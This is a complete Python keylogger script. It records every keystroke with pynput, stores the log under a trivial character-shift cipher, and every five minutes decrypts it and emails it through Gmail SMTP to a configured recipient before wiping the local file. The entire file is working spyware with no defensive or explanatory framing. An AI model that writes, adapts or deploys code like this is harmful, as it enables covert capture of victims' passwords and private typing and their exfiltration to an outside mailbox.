import datetime
import os
import smtplib
import time
import threading
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pynput import keyboard

# Define log file and email interval
log_file = "keylog.txt"
email_interval = 300  # Send email every 5 minutes

# Encryption function (Caesar Cipher)
def encrypt_log(text):
    return ''.join(chr(ord(char) + 2) for char in text)

# Decryption function
def decrypt_log(text):
    return ''.join(chr(ord(char) - 2) for char in text)

# Write encrypted keystrokes to log file
def write_to_file(key):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {key}\n"
    encrypted_entry = encrypt_log(log_entry)
    
    with open(log_file, "a") as file:
        file.write(encrypted_entry)

# Send email with decrypted log contents and clear the file
def send_email():
    sender_email = ''
    receiver_email = ''
    password = ''  # Use an App Password, NOT your real password

    try:
        with open(log_file, "r") as file:
            encrypted_content = file.read()

        # Decrypt the log content before sending
        decrypted_content = decrypt_log(encrypted_content)

        # Email setup
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver_email
        msg['Subject'] = "Decrypted Keylogger Report"
        msg.attach(MIMEText(decrypted_content, 'plain'))

        # Send the email
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, password)
        server.send_message(msg)
        server.quit()
        
        print("Email sent successfully!")

        # Clear the log file after sending
        open(log_file, "w").close()

    except Exception as e:
        print(f"Error sending email: {e}")

# Function to send emails at regular intervals
def send_email_periodically():
    while True:
        time.sleep(email_interval)
        send_email()

# Function to capture key presses
def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            write_to_file(key.char)
        else:
            write_to_file(f'[{key}]')
    except Exception as e:
        print(f"Error: {e}")

# Start the email sender thread
email_thread = threading.Thread(target=send_email_periodically, daemon=True)
email_thread.start()

# Start the keyboard listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
